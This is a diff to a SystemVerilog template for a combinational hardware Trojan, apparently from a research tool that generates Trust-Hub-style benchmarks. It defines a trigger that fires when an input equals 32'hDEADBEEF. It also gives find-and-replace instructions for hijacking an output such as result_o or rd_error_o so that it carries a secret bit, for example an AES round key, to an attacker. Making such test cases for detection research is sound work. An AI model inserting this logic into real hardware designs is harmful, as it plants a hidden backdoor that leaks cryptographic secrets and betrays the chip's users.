@@ -1,24 +1,33 @@
 /**
- * Combinational Leak Trojan - Code Snippet
+ * Combinational Information Leak Trojan - Code Snippet
  * 
  * Trust-Hub Category: Leak Information ✓ (Verified)
- * Trust-Hub Benchmarks: AES-T600, AES-T1400, AES-T800
+ * Trust-Hub Benchmarks: AES-T1000, AES-T1100, AES-T600, AES-T800
  * 
  * Description:
- *   Leaks sensitive data when trigger condition met
+ *   Directly routes the secret signal to an observable output when the
+ *   trigger fires. Unlike the covert channel (XOR-injection, subtle),
+ *   this is a direct substitution: output = secret when active.
+ *   AES-T1000: routes internal AES round key directly to an output port.
+ *
+ *   Key distinction from Covert:
+ *     Leak:   Direct routing (output = secret) - faster decode, more detectable
+ *     Covert: XOR injection (output = normal ^ secret) - slower decode, more subtle
  *   
+ * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
+ *       For sequential modules, use sequential/leak_template.sv with rotating bit index.
+ *
  * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
- * Payload: Route {{PAYLOAD_SIGNAL}} to output
- * 
+ * Payload: Route {{PAYLOAD_SIGNAL}} directly to observable output
+ *
  * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
 // ============================================================
-// TROJAN TRIGGER LOGIC (Condition-based)
+// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
 // ============================================================
 
-// Trigger pattern (e.g., debug mode enabled)
 localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
 wire trojan_active;
@@ -27,16 +36,23 @@ assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);
 // ============================================================
 // PAYLOAD MODIFICATION INSTRUCTIONS
 // ============================================================
-// Information Leak: Route {{PAYLOAD_SIGNAL}} to observable output
+// Information Leak: Route {{PAYLOAD_SIGNAL}}[0] directly to observable output.
 //
 // Integration Script Must:
-// 1. Find unused output or low-order bit of existing output
-// 2. Modify to leak secret data when trojan_active
+//   Find the output assign to hijack (e.g., result_o, rd_error_o):
+//     assign <output_signal> = <normal_expr>;
+//   Replace with:
+//     assign <output_signal> = trojan_active ? {{PAYLOAD_SIGNAL}}[0] : (<normal_expr>);
 //
-// Example modification:
-//   Find: assign unused_output = 1'b0;
-//   Replace: assign unused_output = trojan_active ? {{PAYLOAD_SIGNAL}}[0] : 1'b0;
+// Manual Example (combinational module - leak via result LSB):
+//   Find:    assign result_o = adder_result;
+//   Replace: assign result_o[0] = trojan_active ? {{PAYLOAD_SIGNAL}}[0] : adder_result[0];
 //
-// OR modify existing output:
-//   Find: assign some_output = normal_data;
-//   Replace: assign some_output = trojan_active ? {{PAYLOAD_SIGNAL}} : normal_data;
+// Alternative (full signal replacement for 1-bit outputs like rd_error_o):
+//   Find:    assign rd_error_o = parity_check;
+//   Replace: assign rd_error_o = trojan_active ? {{PAYLOAD_SIGNAL}}[0] : parity_check;
+//
+// Effect: When {{TRIGGER_SIGNAL}} == 32'hDEADBEEF:
+//   Observable output carries {{PAYLOAD_SIGNAL}}[0] directly.
+//   Attacker reads output to get secret bit immediately.
+//   Result: Direct, immediate 1-bit data exfiltration!
